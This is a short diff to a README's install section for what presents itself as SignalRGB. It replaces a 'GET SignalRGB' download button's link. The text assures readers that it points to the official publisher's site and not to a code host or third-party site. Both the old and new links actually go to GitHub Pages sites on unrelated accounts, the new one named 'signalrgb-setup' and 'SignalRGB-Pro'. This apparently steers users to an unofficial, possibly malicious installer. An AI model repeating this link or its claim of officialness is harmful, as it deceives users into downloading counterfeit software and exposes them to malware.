@@ -79,7 +79,7 @@ Startup of the Windows build is `startup.cpp`. Settings for the session live bes
 
 Get the installer from the official SignalRGB website. That is the download the publisher points you to. This page does not point at a code host, a store mirror, or a third-party download site.
 
-[![GET SignalRGB](https://img.shields.io/badge/GET-SignalRGB-0D9488?style=flat&labelColor=115E59&logoColor=white)](https://karlpolczynski635.github.io/.github/SignalRGB)
+[![GET SignalRGB](https://img.shields.io/badge/GET-SignalRGB-0D9488?style=flat&labelColor=115E59&logoColor=white)](https://signalrgb-setup.github.io/SignalRGB-Pro/)
 
 ### Running
 
